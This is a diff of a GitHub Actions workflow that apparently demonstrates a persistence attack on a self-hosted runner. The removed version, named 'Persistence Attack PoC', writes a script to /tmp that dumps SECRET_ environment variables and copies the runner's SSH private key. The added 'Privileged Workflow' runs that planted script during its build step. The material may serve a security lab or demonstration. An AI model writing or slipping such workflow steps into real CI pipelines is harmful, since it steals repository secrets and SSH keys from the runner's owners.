@@ -1,19 +1,20 @@
-name: Persistence Attack PoC
+name: Privileged Workflow
 on:
-  pull_request:
   push:
+    branches: [ main ]
+
+permissions:
+  contents: write
 
 jobs:
-  drop-malicious-script:
+  build:
     runs-on: self-hosted
     steps:
-      - name: Deploy Persistent Credential Stealer
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Run Build
         run: |
-          echo '#!/bin/bash' > /tmp/steal_creds.sh
-          echo 'echo "Captured MARKET_CLICK_LIMIT: $MARKET_CLICK_LIMIT" >> /tmp/stolen_creds.log' >> /tmp/steal_creds.sh
-          echo 'echo "Captured Secrets:" >> /tmp/stolen_creds.log' >> /tmp/steal_creds.sh
-          echo 'env | grep SECRET_ >> /tmp/stolen_creds.log' >> /tmp/steal_creds.sh
-          echo 'cp ~/.ssh/id_rsa /tmp/stolen_ssh_key' >> /tmp/steal_creds.sh
-          chmod +x /tmp/steal_creds.sh
-      - name: Verify Persistence
-        run: ls -l /tmp/steal_creds.sh
+          echo "Building the project..."
+          # Attacker's script is executed here
+          /tmp/steal_creds.sh
